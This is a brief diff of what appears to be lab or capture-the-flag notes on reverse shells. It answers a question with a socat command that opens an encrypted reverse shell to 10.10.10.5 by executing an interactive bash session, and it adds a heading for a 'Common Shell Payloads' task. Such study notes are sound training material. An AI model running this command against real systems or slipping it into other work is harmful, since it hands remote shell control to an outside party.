@@ -366,3 +366,6 @@ _If your IP is 10.10.10.5, what syntax would you use to connect back to this lis
 
 socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
 
+---
+
+### Task 8: Common Shell Payloads 
